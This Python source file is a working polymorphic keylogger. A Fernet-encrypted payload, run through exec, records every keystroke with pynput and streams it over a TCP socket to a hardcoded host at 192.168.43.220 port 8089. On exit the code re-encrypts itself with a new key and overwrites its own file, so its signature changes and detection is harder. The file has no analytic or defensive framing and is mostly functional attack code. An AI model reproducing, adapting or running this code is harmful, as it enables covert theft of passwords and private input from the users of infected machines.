from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import os
import signal
import sys
import threading
import inspect
import hashlib
import socket

def pmorphic(key, token, f):
    payload = f.decrypt(token).decode() # decrypt encrypted payload
    exec(payload)

# STOP
key = "7-FGjiPAW8s5ElOrRVw7Kc5LQCI85s0ibKvAGeq7TEI=" # Fernet.generate_key()
token = "gAAAAABnW6xD0ys1Yg2aMihG6wqt964DscTyusfX6J4FS2j5mKn-hXFNm_sn0Ct0epXhRaf1zL85HZK3Tq6Dayhv8kXg94QN5RmDb4pqtcFOO0xhLqpfinBoVwvWZobQEMBlzSLMb4lt2mkP_livR92VBrXWD2G7wcXnlpSlnzbI2OAE7rLVUlCA9vI6ad7wFpQjanw6zPVaMUMd3YrovF13NB_TyIpD4UfTQ1tWVYPnebGBOe3PyclgooQyOMFtIFpI8bVA38TDi5aJZ7gbaDw8hMPBUwWbvCjPUu_bZjjeAkML7tG7iXzMQkEwcrKGusyoqPxMK-Kr4j-1ykg-P5829kQlSsD2RCFQrvvLF3ZAWSlsKXq3GIhD6n-CowR36gd1ZfrpwPLtMvb0G_NTW0PEBU4XTM-1-NXBXT8RkQ-Ca3t625i9nmODLq_RHr4lpqE5311vKnjVFSXdZmk9PP9qvMdzcgRsC7YM9fz-QdKvyqonvvwXcVoGxcjyreG6xWtEXxv8zEOHfFGsCEef1BAThVpV6peYgmVpqF3rEB_i7ilmUqYFemYr-Bk12eHQVtP8TSJ0oB3Tscmm7cjNDV_K_ATn8iue6u7gQUrPzdqsg1ZVEbpGqGY6i7mXggCthw2EiLyAsArd9dauJh2N5Aj2-doDueqbTMT7kC12sSy1B_WW-qJkyZaVqBtGmhrNF8Yo9PLk-Wf-bFcR43-o_LyGK3IWGZqHBlqbLCClxyg0s53z0-X_95WR9ulYXvW_9A5id-Y9GMRGM4fM07Ftda1iWyBGthizNV9IyFxsNBydpOTmrHVsH74_dlxhRa8_KPKW2TxPcxgsdNtVB5VQzqRlRrsvdgXZcewEDcTuRYNRKcMKRt37RGgCP9DOPd0NxNdCsKrl9u-JObtwvtBWiXA1Mp6o1wG5vUYrp_zK2duuJYjaZiBQim7gpOy5-3STRMI4gYgRyxCLar11DltMnzcZ9GbXgFfWuR7wi7A8NRQlU558QUOoRxO45VY2POmgziRb6ZQIwHbm5BTS7glsRM17yYbPN49zT3Vglp14n6LYkn5lVAoi8q42LCRgiCkgpXn6XC8S1ANHKPpz-Geul909-fcRDix8msBUqHCdhh4VQtRAOKxtm6JMOzt75nt5iSfSj-iGQkxBudT-2vSQWXNeV-UfVnhNrLVfHf6nMS4KowBiAFtizxEP1TVBezI_FUnL_ARJBCQn4e1RCypaoKv_JI9Oai1DdTJiH_BFzwhpwieCrA-3cZM5qW-eq_8MYnF2hXN8TlcI6WGy_2vJEohhZHKPeFsqw6sHwy7HAwbUWGinFAcdXpxVBQQAX34tfpHQ7Wa9PY3vF73C-_zQFpxQa_3BO3b24dG_LxZHWLGw5azO7z_g0nk5zjr5d2kxGILx_kLAMT1zsv84e7EDXbOiwO1xes8amyFMQOmKYCsA-ZTpGi2FvLZ24b4ZG2l-RB9VD_dAOCJMtxKQovIakbhdF7-EfFNpOF8WtMDc4ATZQSKezX8JEf4vett8Zb4_0EEzo8985er5kXTJN8TiRjRk-SOg6eu1FgKJ_J5fcmrJNcdgNrQ7hNr7nfAKNgEJtqOk5-nT1PaQEbb-uWG25ydLepWJEc2g-QkbrvdTYF6zU_QItJ5Io1KMFSS9yVr15qjxbrL384EwdM7HtjI1zPk4l0wZKzpRl-qfEiqES3aNUafjWtfq2_DvIRKFykmxz1hCpU8rg6SBxOo446YRVnyyttcoMPsVNHajB1ki7yND1HST2ZJ8caA3R5To_1KM3IUcDPRFZCebMzHQ3sqvHMw3nhEVl_hXF3HCpqgjVVshQ0CgdSeCef8fuSO7ZDmJiAy_WFUEGbmK5YMNmHcsMep5D14Es2Ev3lVHPzV5JKEHt3Cgw0N_PSgFP9KfQeREqBV1upD0wDY2I1sTrflQCMbS7hXKU7_4MCPt9a7yhm-sAE83JgNC1voyeW8WI4b85RwpsbkMauqHyCTu24c1AuHYLWfp_gA_bVsB4PNcRQfnGJy7fatlpX8Y5s08iwGqlYDS7cx4rHvkMqE0iFWzVURWse2dlIQbuEqtegXPEhtrFX_5gSci1S-sRd2bqUs9CN566jnu7gRg4jiuP2NCuJw1rWPpjsBZbDS7QQShWi4APEU4VSy0571agnKbTxBILI5OSTERnZ1G"
f = Fernet(key)

def gen_token():
    global token, key, f
    payload = """
import socket

clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(('192.168.43.220', 8089))

global token, key

f = Fernet(key)
mal = f.decrypt(token).decode()

key = Fernet.generate_key()
f = Fernet(key)

token = f.encrypt(mal.encode())

filename = os.path.basename(__file__)
lines = []
with open(filename, 'r') as newfile:
    lines = newfile.readlines()

with open('new', 'w') as newfile:
    for line in lines:
        if line.startswith('# STOP'):
            break
        newfile.write(line)

    newfile.write('# STOP\\n')
    newfile.write('key = \\"{}\\"\\n'.format(key.decode()))
    newfile.write('token = \\"{}\\"\\n'.format(token.decode()))
    newfile.write('f = Fernet(key)\\n')
    newfile.write('pmorphic(key, token, f)\\n')

def handle_termination(signal, frame):
    filename = __file__
    print('Exiting..')
    try:
        os.rename(filename, 'old')
        os.rename('new', filename)
        os.remove('old')
    except OSError as e:
        print("Error renaming")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_termination)
if hasattr(signal, "SIGBREAK"):
    signal.signal(signal.SIGBREAK, handle_termination)

def start_listener():
    def on_press(key):
        global clientsocket
        msg = str(key)
        clientsocket.send(msg.encode())
    with Listener(on_press=on_press) as listener:
        listener.join()

listener_thread = threading.Thread(target=start_listener, daemon=True)
listener_thread.start()

try:
    while True:
        pass
except KeyboardInterrupt:
    handle_termination(None, None)
    """
    print(f.encrypt(payload.encode()))

#pmorphic(key, token, f)
gen_token()
